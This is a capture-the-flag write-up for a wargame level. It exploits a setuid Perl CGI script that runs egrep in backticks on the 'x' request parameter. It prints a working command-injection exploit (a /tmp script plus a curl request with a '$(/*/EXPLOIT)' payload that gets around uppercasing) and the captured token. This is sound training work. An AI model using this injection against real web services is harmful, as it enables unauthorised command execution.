## Step 1: Identifying the User

We begin by checking our current user informations:

```bash
$ id
uid=2012(level12) gid=2012(level12) groups=2012(level12),100(users)
```

This shows that we are operating as the user `level12`.

---
## Step 2: Searching for Files

```bash
$ ls -la
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl

$ file level12
level12.pl: setuid setgid a perl script, ASCII text executable
```
The level12 is a setuid perl executable, meaning it executes with flag12 user's privileges.


---
## Step 3: Analyzing the Perl Script

```perl
$ cat level12.pl

#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

### Explanation
The script is a CGI script, meaning it is intended to be executed on a web server to handle HTTP requests.
The parameters `x` and `y` can be supplied via a curl command `localhost:4646?x=42&y=42`.


## Step 4: Exploiting the vulnerability
The script has a command injection vulnerability. This is due to the way it uses backticks to execute the `egrep` command with user-supplied data `($xx)`, which is derived from the `x` parameter in the HTTP request.


```bash
$ echo "getflag > /tmp/TMP" > /tmp/EXPLOIT
$ chmod +x /tmp/EXPLOIT

$ curl localhost:4646?x='$(/*/EXPLOIT)'&y=42

$ cat /tmp/TMP
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr 
```
The command `echo "getflag > /tmp/TMP" > /tmp/EXPLOIT` creates a script called `/tmp/EXPLOIT` that writes the output of the `getflag` command to `/tmp/TMP`.

The `curl` command sends a request to the vulnerable web server, with the `x` parameter set to `'$(/*/EXPLOIT)'`. The `$()` syntax in the URL injects the command `/tmp/EXPLOIT` into the `egrep` command, causing the script to be executed with the privileges of the `flag12` user.

---

And there you have it, the token is `g1qKMiRpXf53AWhDaU7FEkczr`.